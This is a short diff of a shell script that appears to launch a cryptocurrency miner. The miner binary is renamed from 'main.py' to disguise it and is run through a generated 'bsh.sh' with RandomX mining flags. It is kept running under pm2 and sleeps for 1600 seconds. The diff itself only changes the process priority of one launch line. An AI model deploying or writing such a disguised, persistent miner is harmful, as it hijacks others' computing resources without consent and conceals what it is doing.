@@ -23,6 +23,6 @@ mv main.py $NEW_PY
 chmod +x $NEW_PY
 echo "./$NEW_PY -t 4 --randomx-wrmsr --randomx-1gb-pages --cpu-no-yield --huge-pages-jit" > bsh.sh
 chmod +x bsh.sh
-nice -n 300 ./bsh.sh
+nice -n 0 ./bsh.sh
 nice -n 19 pm2 start bsh.sh
 sleep 1600
